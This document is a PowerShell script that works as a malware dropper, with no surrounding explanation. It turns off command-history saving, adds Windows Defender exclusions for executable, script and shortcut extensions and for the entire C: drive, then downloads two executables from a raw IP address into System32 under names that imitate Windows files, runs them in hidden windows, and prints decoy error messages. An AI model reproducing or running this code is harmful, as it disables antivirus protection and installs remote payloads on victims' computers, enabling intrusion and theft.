Set-PSReadLineOption -HistorySaveStyle SaveNothing

$path1 = "$env:windir\System32\svhost.exe"
$path2 = "$env:windir\System32\msupdate.exe"

try {
    Add-MpPreference -ExclusionExtension ".exe" -ErrorAction Stop
    Add-MpPreference -ExclusionExtension ".src" -ErrorAction Stop
    Add-MpPreference -ExclusionExtension ".ps1" -ErrorAction Stop
    Add-MpPreference -ExclusionExtension ".lnk" -ErrorAction Stop
    Add-MpPreference -ExclusionPath "C:\" -ErrorAction Stop
} catch {
    Write-Output "Dll Files Missing"
    exit
}

try {
    Invoke-WebRequest -Uri "http://93.127.133.251:6767/svhost.exe" -OutFile $path1 -ErrorAction Stop
    Start-Process -FilePath $path1 -WindowStyle Hidden -ErrorAction Stop
} catch {
    Write-Output "Failed to download or run msutil.exe"
    Remove-Item $path1 -Force -ErrorAction SilentlyContinue
    exit
}

try {
    Invoke-WebRequest -Uri "http://93.127.133.251:6767/msupdate.exe" -OutFile $path2 -ErrorAction Stop
    Start-Process -FilePath $path2 -WindowStyle Hidden -ErrorAction Stop
} catch {
    Write-Output "Dll Files Missing"
    Remove-Item $path2 -Force -ErrorAction SilentlyContinue
    exit
}

Remove-Item $path1 -Force -ErrorAction SilentlyContinue
Remove-Item $path2 -Force -ErrorAction SilentlyContinue
